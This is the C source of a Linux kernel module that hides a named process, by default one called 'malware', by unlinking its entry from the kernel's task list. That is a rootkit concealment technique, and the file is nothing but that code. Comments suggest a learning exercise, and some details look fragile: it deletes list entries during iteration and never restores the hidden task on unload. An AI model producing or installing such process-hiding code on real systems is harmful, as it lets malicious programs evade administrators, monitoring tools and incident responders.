#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/sched.h>
#include <linux/sched/signal.h>  // for_each_process

extern rwlock_t tasklist_lock;
static char *target_process = "malware";
module_param(target_process, charp, 0);

static int __init hide_process_init(void) {
    struct task_struct *task;
    unsigned long flags;

    printk(KERN_INFO "Hide Process Module Loaded\n");

    // 遍历所有进程
    for_each_process(task) {
        // TODO: hide target_process
        if(next_task(task) != &init_task && strcmp(next_task(task)->comm, target_process) == 0)
        {
            printk(KERN_INFO "PID: %d | COMM: %s\n", task->pid, task->comm);
            
            write_lock_irqsave(&tasklist_lock, flags);
            list_del(&next_task(task) -> tasks);
            write_unlock_irqrestore(&tasklist_lock, flags);
        }
    }

    return 0;
}

static void __exit hide_process_exit(void) {
    printk(KERN_INFO "Hide Process Module Unloaded\n");
}

module_init(hide_process_init);
module_exit(hide_process_exit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Your Name");
MODULE_DESCRIPTION("A simple kernel module to hide a process");